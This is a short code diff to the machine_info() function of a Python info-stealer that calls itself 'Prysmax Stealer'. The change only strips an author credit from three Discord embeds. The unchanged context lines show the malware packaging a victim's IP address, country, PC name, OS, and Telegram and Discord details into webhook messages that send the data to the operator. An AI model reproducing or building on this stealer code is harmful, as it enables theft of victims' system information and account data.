@@ -554,7 +554,7 @@ def machine_info():
     embed = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
 
     # Add embed author, thumbnail, fields, and footer
-    embed.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed.set_author(icon_url='https://i.imgur.com/rKRyGlx.jpeg')
     embed.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
     embed.add_embed_field(name='🖤 IP', value=f'{theip}')
     embed.add_embed_field(name='🖤 Country', value=f'{ip_country}')
@@ -567,7 +567,7 @@ def machine_info():
     embed2 = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
 
     # Add embed author, thumbnail, fields, and footer
-    embed2.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed2.set_author(icon_url='https://i.imgur.com/rKRyGlx.jpeg')
     embed2.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
     embed2.add_embed_field(name='​🖤​ PC Name', value=f'{pc_name}')
     embed2.add_embed_field(name='​🖤​ OS', value=f'{pc_os}')
@@ -582,7 +582,7 @@ def machine_info():
     embed3 = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
 
     # Add embed author, thumbnail, fields, and footer
-    embed3.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed3.set_author(icon_url='https://i.imgur.com/rKRyGlx.jpeg')
     embed3.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
     embed3.add_embed_field(name='​🖤​ Telegram', value=f'{telegram}')
     embed3.add_embed_field(name='​🖤​ Discord', value=f'{Discord}')
